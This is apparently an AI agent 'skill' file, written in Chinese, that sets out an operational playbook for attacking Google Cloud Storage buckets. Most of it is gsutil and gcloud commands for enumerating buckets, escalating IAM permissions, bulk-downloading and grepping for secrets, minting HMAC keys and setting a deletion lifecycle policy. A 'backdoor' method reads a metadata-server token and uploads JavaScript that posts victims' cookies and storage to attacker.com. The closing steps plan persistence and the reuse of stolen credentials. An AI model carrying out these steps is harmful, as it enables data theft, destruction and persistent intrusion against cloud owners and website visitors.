---
name: gcp-storage-attack
type: attack
category: storage
platform: gcp
severity: high
---

# GCP Cloud Storage 攻击技能

## 触发条件

- 有 GCP 凭证
- 发现 GCS 存储桶
- 用户要求"攻击 GCP Storage"

## 前置检查

```bash
# 1. 验证凭证
gcloud auth list

# 2. 列出存储桶
gsutil ls

# 3. 检查权限
gsutil iam get gs://BUCKET_NAME
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试访问存储桶
gsutil ls gs://BUCKET_NAME

# 2. 尝试读取对象
gsutil cat gs://BUCKET_NAME/object.txt

# 3. 枚举常见存储桶名
for bucket in "backup" "backups" "data" "logs" "config" "secrets" "credentials" "exports"; do
  echo "Testing gs://PROJECT_ID-$bucket"
  gsutil ls gs://PROJECT_ID-$bucket 2>/dev/null && echo "Found!"
done
```

### 方法 2: 权限提升

```bash
# 1. 检查当前权限
gsutil iam get gs://BUCKET_NAME

# 2. 如果有 storage.objects.setIamPolicy 权限
# 添加自己为 Owner
gsutil iam ch user:YOUR_EMAIL@DOMAIN.COM:objectCreator,objectViewer \
  gs://BUCKET_NAME

# 3. 给 Service Account 授权
gsutil iam ch serviceAccount:SA@PROJECT_ID.iam.gserviceaccount.com:admin \
  gs://BUCKET_NAME
```

### 方法 3: 敏感数据窃取

```bash
# 1. 列出所有对象
gsutil ls -r gs://BUCKET_NAME

# 2. 搜索敏感文件
gsutil ls -r gs://BUCKET_NAME/**/*secret*
gsutil ls -r gs://BUCKET_NAME/**/*password*
gsutil ls -r gs://BUCKET_NAME/**/*key*
gsutil ls -r gs://BUCKET_NAME/**/*credential*

# 3. 批量下载
mkdir -p /tmp/stolen-data
gsutil -m cp -r gs://BUCKET_NAME /tmp/stolen-data/

# 4. 搜索敏感信息
grep -r -E "password|secret|token|api[_-]?key" /tmp/stolen-data/
```

### 方法 4: 版本控制攻击

```bash
# 1. 检查版本控制状态
gsutil versioning get gs://BUCKET_NAME

# 2. 列出所有版本
gsutil ls -a gs://BUCKET_NAME/**

# 3. 恢复旧版本（可能包含敏感信息）
gsutil cp gs://BUCKET_NAME/object.txt#GENERATION gs://BUCKET_NAME/object.txt
```

### 方法 5: HMAC 密钥利用

```bash
# 1. 列出 HMAC 密钥（如果有 serviceAccountTokenCreator 权限）
gcloud storage hmac keys list --project=PROJECT_ID

# 2. 创建新的 HMAC 密钥
gcloud storage hmac keys create --service-account=SA@PROJECT_ID.iam.gserviceaccount.com \
  --project=PROJECT_ID

# 3. 使用 HMAC 密钥访问
# 设置环境变量
export GOOGLE_STORAGE_ACCESS_KEY=ACCESS_KEY
export GOOGLE_STORAGE_SECRET_KEY=SECRET_KEY

# 使用 s3cmd 或类似工具
s3cmd ls s3://BUCKET_NAME
```

### 方法 6: 签名 URL 利用

```bash
# 1. 生成签名 URL（如果有 objects.create 权限）
gsutil signurl -d 10m \
  -c "text/plain" \
  /path/to/key.pem \
  gs://BUCKET_NAME/sensitive.txt

# 2. 使用签名 URL 访问
curl "https://storage.googleapis.com/BUCKET_NAME/sensitive.txt?GoogleAccessId=..."

# 3. 分享签名 URL 给其他人
```

### 方法 7: 生命周期策略利用

```bash
# 1. 查看生命周期策略
gsutil lifecycle get gs://BUCKET_NAME

# 2. 修改策略（如果有 storage.objects.update 权限）
cat > lifecycle.json <<'EOF'
{
  "lifecycle": {
    "rule": [{
      "action": {"type": "Delete"},
      "condition": {
        "age": 1,
        "matchesStorageClass": ["NEARLINE"]
      }
    }]
  }
}
EOF

gsutil lifecycle set lifecycle.json gs://BUCKET_NAME
```

### 方法 8: 存储桶后门

```bash
# 1. 创建恶意对象
echo "Backdoor: $(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google')" > malicious.txt

# 2. 上传到存储桶
gsutil cp malicious.txt gs://BUCKET_NAME/backdoor.txt

# 3. 如果是公共网站托管
# 上传恶意 JavaScript
cat > steal.js <<'EOF'
fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage}
  })
});
EOF
gsutil cp steal.js gs://BUCKET_NAME/steal.js
gsutil iam ch allUsers:objectViewer gs://BUCKET_NAME
```

### 方法 9: 跨账户攻击

```bash
# 1. 检查存储桶策略中的外部账户
gsutil iam get gs://BUCKET_NAME | grep -E "@.*\.iam\.gserviceaccount\.com"

# 2. 如果有自己的账户，添加权限
gsutil iam ch user:YOUR_EMAIL@DOMAIN.COM:legacyBucketReader,legacyObjectReader \
  gs://BUCKET_NAME

# 3. 使用多个账户访问
for account in "account1@example.com" "account2@example.com"; do
  gcloud config set account $account
  gsutil ls gs://BUCKET_NAME
done
```

### 方法 10: 公共访问枚举

```bash
# 1. 检查所有存储桶的公共访问
for bucket in $(gsutil ls); do
  echo "Checking $bucket"
  gsutil iam get $bucket | grep -E "allUsers|allAuthenticatedUsers"
done

# 2. 检查特定项目的公共存储桶
gcloud storage buckets list --project=PROJECT_ID \
  --format="table(name,iamConfiguration.bucketPolicyOnly.enabled)"

# 3. 使用公共 URL 访问
curl https://storage.googleapis.com/BUCKET_NAME/public-object.txt
```

## 验证成功

```bash
# 成功访问存储桶
gsutil ls gs://BUCKET_NAME

# 成功下载对象
gsutil cp gs://BUCKET_NAME/sensitive.txt /tmp/

# 成功修改权限
gsutil iam get gs://BUCKET_NAME | grep YOUR_EMAIL
```

## 下一步

1. 分析下载的敏感数据
2. 使用窃取的凭证访问其他 GCP 服务
3. 在存储桶中植入后门
4. 监控存储桶变化获取持续数据
